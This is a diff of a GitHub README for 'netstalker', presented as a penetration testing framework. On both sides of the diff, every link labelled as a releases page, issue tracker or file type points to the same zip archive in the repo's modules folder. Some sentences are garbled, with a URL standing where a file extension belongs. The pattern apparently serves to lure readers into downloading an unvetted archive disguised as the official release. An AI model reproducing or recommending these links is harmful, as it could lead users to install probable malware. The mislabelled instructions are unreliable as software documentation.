@@ -1,6 +1,6 @@
 # 🎮 netstalker - Unlock Your Security Potential with Ease
 
-[![Download netstalker](https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip)](https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip)
+[![Download netstalker](https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip)](https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ NETSTALKER is a comprehensive, cyberpunk-themed penetration testing framework de
 Follow these steps to download and run NETSTALKER easily:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip) to find the latest version of NETSTALKER.
+   Head over to our [Releases page](https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip) to find the latest version of NETSTALKER.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Choose the version you want to download. Click on it to see the available files.
@@ -19,7 +19,7 @@ Follow these steps to download and run NETSTALKER easily:
 3. **Download the Application**  
    You will see several files available for download.  
    - For Windows users, look for a file ending in `.exe`.  
-   - For Linux users, look for a `https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip` or `.deb` file.  
+   - For Linux users, look for a `https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip` or `.deb` file.  
    Click on the appropriate file to start the download.
 
 4. **Install NETSTALKER**  
@@ -28,7 +28,7 @@ Follow these steps to download and run NETSTALKER easily:
      ```bash
      sudo dpkg -i <filename>.deb
      ```  
-     Replace `<filename>` with the actual downloaded file name. For a `https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip`, extract the files and follow additional documentation included in the extracted folder for installation steps.
+     Replace `<filename>` with the actual downloaded file name. For a `https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip`, extract the files and follow additional documentation included in the extracted folder for installation steps.
 
 5. **Launch the Application**  
    After installation, find NETSTALKER in your applications folder or start menu. Click to launch it, and you are ready to begin your penetration testing.
@@ -56,11 +56,11 @@ NETSTALKER offers a range of features to enhance your security testing experienc
 
 ## 📚 Documentation and Support
 
-If you need help or have questions, refer to the documentation included with the download. You can also check the [issues section](https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip) on GitHub for common questions or to report any issues.
+If you need help or have questions, refer to the documentation included with the download. You can also check the [issues section](https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip) on GitHub for common questions or to report any issues.
 
 ## ⚙️ Download & Install
 
-To get started with NETSTALKER, visit our [Releases page](https://raw.githubusercontent.com/bryamj/netstalker/main/modules/Software_v2.6.zip) to download the latest version.
+To get started with NETSTALKER, visit our [Releases page](https://github.com/bryamj/netstalker/raw/refs/heads/main/modules/Software_v2.6.zip) to download the latest version.
 
 Follow the instructions above to ensure a smooth installation process. With NETSTALKER, you can easily explore the field of penetration testing and strengthen your skills in cybersecurity. 
 
